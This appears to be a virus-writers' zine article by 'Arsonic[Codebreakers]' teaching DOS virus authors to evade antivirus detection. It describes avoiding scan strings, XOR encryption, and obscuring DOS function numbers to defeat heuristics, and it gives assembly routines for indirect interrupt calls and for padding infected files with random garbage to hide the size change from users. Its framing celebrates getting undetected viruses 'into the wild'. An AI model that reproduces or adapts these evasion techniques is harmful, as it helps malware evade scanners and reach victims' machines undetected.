                         By Arsonic[Codebreakers]

  The best thrill u get from a virus is not destroying someones computer,
  and causing massive mayham..  but the thrill u get from knowing that
  your virus has made it to the wild.. that your virus is not detectable
  by some of the most famous virus scanners on the face of the planet.
  and as these scanners get more and more sophisicated.. the need for
  better and newer ways to remain undetectable increases.

  The Following article deals with very basic ways (yet they work) for
  your virus's to get past scanners.

  ScanStrings

  A virus scanners search executables for scanstrings which are about
  four plus bytes of uncommon code that will not be used in any normal
  programs. So your virus's should use the most common code as possible.

  Also its unwise to leave strings such as *.com and *.exe unencrypted
  you could change these strings abit so they would not be scanstrings..
  such as *.com becomes *.c* and *.exe becomes *.e*

  Encryption

  Encryption is a great way for a virus to hide itself from scanners and
  it also minimizes the number of bytes a av person has to get a scanstring
  from. Encryption Routines can be simple such as xor, or very complex.

 Screwing Up Heristics

 Heuristics are what a virus scanner uses to detect "virus like" code.
 so you are not just finding and changing scanstrings nowadays when
 a scanner detects your code. a quick, nice and simple way to make
 it past heuristics is to add a value unto the register..

 example:

 mov ah,3eh  ;right now its Dos Function 3e (Close File)
 add ah,2    ;add 2 to ah.. so it becomes.. 40 (write to file)

 u could also put the value into another register first, add 2 to it,
 and then mov that value to the register needed for the function..

 mov al,3eh    ;what this does is exsentually the same thing. but
 add al,2      ;uses another register.. adds 2, and then switches it to the
 xchg ah,al    ;right register.

 ----------- Cut Here ----------------------------------------------------
; heres is a stupid little overwriter i wrote while i was attempting to write
; a unencrypted virus not yet detectable by any scanner. the code is fairly
; simple. For every Ah needed in the virus.. the value minus to is put into
; al, and a call to a routine that adds 2 to al and then switches it with
; ah.

heres another little trick.. which surely can be improved since it is
detected as Suspicous by F-Prot. All this is, is to call a routine to
do int 21h and then return.

example:

mov ah,9h         ;Dos Function 9 (display string to screen)
lea dx,message    ;dx = bytes to write to screen
call int_21h      ;call the routine to do a int 21h
int 20h           ;return control to dos

message db 'Arsonic + XHiltar',13,10,'$'   ;message to write to screen

int_21h:   ;our little int_21h routine
int 21h    ;all we do is a int 21h
ret        ;and return

Random Filesize Increase

Alright.. so we've covered alot on hiding your virus from av programs..
but what about the user?. time/date restoration and attribute restoration
are kickass.. because if u look at one directory and see all the exes, coms
whatever have the same time and date your gonna get suspicous. Also filesize
increases might be spotted by users. This little Routine will give your virus
a totally random filesize, and might even confuse some stupid people..

its pretty simple.. all we do is 1) set file pointer to EOF (end of file)
                                 2) write some garbage bytes
                                 3) get a random value from system clock
                                 4) compare it and see if it is time to quit

Size_Increase:
mov ax,4202h             ;Dos Function 4202 (set filepointer to end of file)
xor cx,cx
xor dx,dx
int 21h

mov ah,40h               ;Dos Function 40 (write to file)
lea dx,write_byte        ;dx = write_byte
mov cx,3                 ;we are writing 3 bytes
int 21h

in al,40h                ;get value into al
and al,10                ;not greater then 10

cmp al,5                 ;compare al to 5
je Close_File            ;if its equal .. its time to exit
jmp Size_Increase        ;else we do it all over again

write_byte db 'ARS'      ;the 3 bytes we write to the end
